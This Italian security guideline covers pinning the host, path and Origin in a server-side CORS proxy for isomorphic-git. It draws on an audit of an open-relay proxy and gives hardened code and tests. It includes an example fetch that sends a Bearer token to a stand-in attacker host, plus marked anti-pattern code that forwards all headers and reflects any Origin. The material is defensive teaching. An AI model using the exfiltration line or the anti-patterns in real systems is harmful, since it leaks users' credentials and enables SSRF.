---
title: 'Un endpoint proxy fissa le sue destinazioni oppure è un open relay'
category: platform
summary: 'Qualsiasi proxy lato server che costruisce l''URL di upstream a partire dalla richiesta deve mettere host e path in allowlist, validare l''Origin e rimuovere i cookie — altrimenti inoltra le credenziali dei tuoi utenti a chiunque le chieda.'
principle: 'Ogni proxy valida tre cose prima di fare la fetch: l''host di destinazione (allowlist), il path di destinazione (il pattern più stretto che serve la funzionalità) e l''Origin del chiamante; rimuove i cookie e inoltra le intestazioni di auth solo verso l''host fissato.'
severity: non-negotiable
tags: [platform, proxy, ssrf, cors, workers, security]
sources:
  - project: 'una SPA di amministrazione contenuti'
    date: 2026-06-11
    note: 'Il proxy CORS interno all''app per isomorphic-git è andato in produzione senza il pin dell''host che aveva il suo predecessore standalone; l''audit ha trovato un open relay che inoltrava Authorization verso host arbitrari.'
related:
  - platform/cross-origin-auth-survives-cookie-blocking
  - error-handling/always-check-res-ok
order: 5
updated: 2026-06-11
---

Un browser non può parlare git smart-HTTP a GitHub direttamente, perché GitHub non
serve alcuna intestazione CORS su quegli endpoint, quindi una SPA di amministrazione
che fa girare isomorphic-git in un Service Worker ha bisogno di un piccolo proxy lato
server. Il proxy riceve `/api/cors/github.com/owner/repo/info/refs`, fa la fetch di
`https://github.com/owner/repo/info/refs` e rispedisce indietro le intestazioni CORS.
Venti righe di Hono. Cosa mai potrebbe andare storto.

A questo ha risposto un audit di sicurezza su una SPA di amministrazione contenuti
(2026-06-11). Il proxy in produzione costruiva la destinazione come `https://${path}`
direttamente dal path della richiesta, senza alcuna validazione, rifletteva qualsiasi
intestazione `Origin` e copiava **ogni** intestazione in ingresso verso la fetch di
upstream, `Authorization` e `Cookie` inclusi. Quell'unico endpoint apriva tre attacchi
distinti:

- **Esfiltrazione di credenziali.** `fetch('https://admin.example/api/cors/attacker.tld/x',
  {headers: {Authorization: 'Bearer ' + token}})` — il worker consegna diligentemente il
  token al server dell'attaccante.
- **SSRF / relay anonimizzante.** La fetch in uscita parte dall'edge worker. Qualsiasi
  API di terze parti, qualsiasi superficie interna raggiungibile da quella rete, ha ora
  il worker come proxy gratuito davanti a sé.
- **Abuso cross-site.** Con `Access-Control-Allow-Origin` riflesso, qualsiasi sito che un
  visitatore apre può pilotare il proxy dal suo browser.

Ecco la parte che brucia: il Worker standalone che questo codice ha sostituito **aveva**
il pin dell'host e l'allowlist di Origin. Entrambe le protezioni sono sparite quando il
proxy è stato portato dentro l'app principale, perché nessuno ha rifatto il threat model
per "lo stesso codice, ma montato su /api". Tratta un porting come una riscrittura, e
dagli la stessa review che ha avuto l'originale.

## Come applicarlo

Fissa tutte e tre le dimensioni nel codice, proprio dove avviene la fetch, non in un
commento:

```ts
// Narrowest pattern that serves the feature: git smart-HTTP only.
const GIT_SMART_HTTP =
  /^github\.com\/[\w.-]+\/[\w.-]+\/(info\/refs|git-upload-pack|git-receive-pack)$/

const ALLOWED_ORIGINS = new Set([
  'https://admin.example.org',
  'https://dev-admin.example.org',
])

export const corsProxy = async (c: Context): Promise<Response> => {
  const origin = c.req.header('Origin')
  if (origin !== undefined && !ALLOWED_ORIGINS.has(origin))
    return new Response('Origin not allowed', { status: 403 })
  const path = c.req.path.replace('/api/cors/', '')
  if (!GIT_SMART_HTTP.test(path))
    return new Response('Target not allowed', { status: 403 })
  const headers = new Headers(c.req.raw.headers)
  headers.delete('host')
  headers.delete('cookie') // session cookie must never reach the upstream
  return fetch(`https://${path}${new URL(c.req.url).search}`, {
    method: c.req.method,
    headers,
  })
}
```

La regex del path fa doppio lavoro. Fissa l'**host** (la stringa deve iniziare con
`github.com/`) e la **forma del path** (solo i tre endpoint che isomorphic-git chiama
davvero). `Authorization` continua a passare, che è proprio il lavoro del proxy, ma può
arrivare solo all'host fissato.

## Anti-pattern

```ts
// Open relay: host comes from the attacker.
const target = `https://${c.req.path.replace('/api/cors/', '')}`

// Reflecting any origin: every website can use your proxy.
out.headers.set('Access-Control-Allow-Origin', c.req.header('Origin') ?? '*')

// Forwarding the full header set: cookies and auth go wherever the path says.
const headers = new Headers(c.req.raw.headers)
```

Il primo si fa notare da solo quando il tuo worker compare nel writeup SSRF di qualcuno.
Gli altri due non ti danno niente: l'esfiltrazione attraverso un proxy permissivo non
produce alcun errore dalla tua parte, ed è proprio quel silenzio a rendere così
pericolosa l'intera classe.

## Enforcement

Qui gli unit test sono economici e diretti. Verifica che un host estraneo restituisca
403 *e che il mock della fetch non sia mai stato chiamato*, che un path github fuori
dallo smart-HTTP restituisca 403, e che `Cookie` venga rimosso mentre `Authorization`
sopravvive. Tieni l'allowlist in un modulo a sé, così i test si leggono come la
specifica di sicurezza.
